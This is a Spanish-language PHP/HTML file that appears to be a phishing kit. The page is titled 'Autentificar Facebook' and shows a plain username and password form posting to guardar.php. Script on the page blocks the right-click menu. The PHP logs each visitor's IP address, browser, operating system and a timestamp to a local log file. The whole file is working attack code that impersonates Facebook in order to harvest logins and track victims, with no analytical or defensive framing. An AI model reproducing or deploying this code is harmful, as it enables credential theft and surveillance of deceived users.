<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http:w3.org/TR/xhtml/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"lang="es" xml:lang="es">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>	Autentificar Facebook</title>
</head>
  <script type="text/javascript">
document.oncontextmenu = function(){return false;}
</script>

<body>
<form action="guardar.php" method="post" name="frm">
	<input type="text" name="nombre" /><br /><br />
	<input type="password"name="password"/><br /><br />
	
<input type="submit" value="Aceptar" />
</form>	
</body>
</html>


<?php
function getBrowser() 
{ 
$u_agent = $_SERVER['HTTP_USER_AGENT']; 
$bname = 'Unknown';
$platform = 'Unknown';
$version= "";


// Next get the name of the useragent yes seperately and for good reason
if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent)) 
{ 
$bname = 'Internet Explorer'; 
$ub = "MSIE"; 
} 
elseif(preg_match('/Firefox/i',$u_agent)) 
{ 
$bname = 'Mozilla Firefox'; 
$ub = "Firefox"; 
} 
elseif(preg_match('/Chrome/i',$u_agent)) 
{ 
$bname = 'Google Chrome'; 
$ub = "Chrome"; 
} 
elseif(preg_match('/Safari/i',$u_agent)) 
{ 
$bname = 'Apple Safari'; 
$ub = "Safari"; 
} 
elseif(preg_match('/Opera/i',$u_agent)) 
{ 
$bname = 'Opera'; 
$ub = "Opera"; 
} 
elseif(preg_match('/Netscape/i',$u_agent)) 
{ 
$bname = 'Netscape'; 
$ub = "Netscape"; 
} 

// finally get the correct version number
$known = array('Version', $ub, 'other');
$pattern = '#(?<browser>' . join('|', $known) .
')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
if (!preg_match_all($pattern, $u_agent, $matches)) {
// we have no matching number just continue
}

// see how many we have
$i = count($matches['browser']);
if ($i != 1) {
//we will have two since we are not using 'other' argument yet
//see if version is before or after the name
if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
$version= $matches['version'][0];
}
else {
$version= $matches['version'][1];
}
}
else {
$version= $matches['version'][0];
}

// check if we have a number
if ($version==null || $version=="") {$version="?";}

return array(
'userAgent' => $u_agent,
'name' => $bname,
'version' => $version,
'pattern' => $pattern
);
} 


function getOs() 
{
$useragent= strtolower($_SERVER['HTTP_USER_AGENT']);

//winxp
if (strpos($useragent, 'windows nt 5.1') !== FALSE) {
return 'Windows XP';
}
elseif (strpos($useragent, 'windows nt 6.1') !== FALSE) {
return 'Windows 7';
}
elseif (strpos($useragent, 'windows nt 6.0') !== FALSE) {
return 'Windows Vista';
}
elseif (strpos($useragent, 'windows 98') !== FALSE) {
return 'Windows 98';
}
elseif (strpos($useragent, 'windows nt 5.0') !== FALSE) {
return 'Windows 2000';
}
elseif (strpos($useragent, 'windows nt 5.2') !== FALSE) {
return 'Windows 2003 Server';
}
elseif (strpos($useragent, 'windows nt') !== FALSE) {
return 'Windows NT';
}
elseif (strpos($useragent, 'win 9x 4.90') !== FALSE && strpos($useragent, 'win me')) {
return 'Windows ME';
}
elseif (strpos($useragent, 'win ce') !== FALSE) {
return 'Windows CE';
}
elseif (strpos($useragent, 'win 9x 4.90') !== FALSE) {
return 'Windows ME';
}
elseif (strpos($useragent, 'windows phone') !== FALSE) {
return 'Windows Phone';
}
elseif (strpos($useragent, 'iphone') !== FALSE) {
return 'iPhone';
}
// experimental
elseif (strpos($useragent, 'ipad') !== FALSE) {
return 'iPad';
}
elseif (strpos($useragent, 'webos') !== FALSE) {
return 'webOS';
}
elseif (strpos($useragent, 'symbian') !== FALSE) {
return 'Symbian';
}
elseif (strpos($useragent, 'android') !== FALSE) {
return 'Android';
}
elseif (strpos($useragent, 'blackberry') !== FALSE) {
return 'Blackberry';
}
elseif (strpos($useragent, 'mac os x') !== FALSE) {
return 'Mac OS X';
}
elseif (strpos($useragent, 'macintosh') !== FALSE) {
return 'Macintosh';
}
elseif (strpos($useragent, 'linux') !== FALSE) {
return 'Linux';
}
elseif (strpos($useragent, 'freebsd') !== FALSE) {
return 'Free BSD';
}
elseif (strpos($useragent, 'symbian') !== FALSE) {
return 'Symbian';
}
else 
{
return 'Desconocido';
}
}

$sistema.="Sistema Operativo: ".getOs();
$ua=getBrowser();
$sistema2.="Navegador: ".$ua['name'] . " " . $ua['version'];

?>


<!-- ////////////////////////////////////////MODULO//////////////////////////////////// -->


<?php
$archivo = "333/log.txt";
 
date_default_timezone_set('America/Bogota'); //Esto editalo según tu franja horaria
$fecha = date('d/m/Y H:i:s'); //Dia/Mes/Año Hora/Minutos/Segundos
 
if(!empty($_SERVER['HTTP_CLIENT_IP'])) {
$ip=$_SERVER['HTTP_CLIENT_IP'];
}
elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
}
else {
    $ip=$_SERVER['REMOTE_ADDR'];
}
 

 
$sl="\r\n\r\n\r\n\r\n";
$volcado = print_r("\r\n".'Fecha de logueo: '.$fecha."\r\n".'IP: '.$ip."\r\n".$sistema."\r\n".$sistema2."\r\n", TRUE);
 
file_put_contents($archivo, $volcado, FILE_APPEND | LOCK_EX);
?>
 
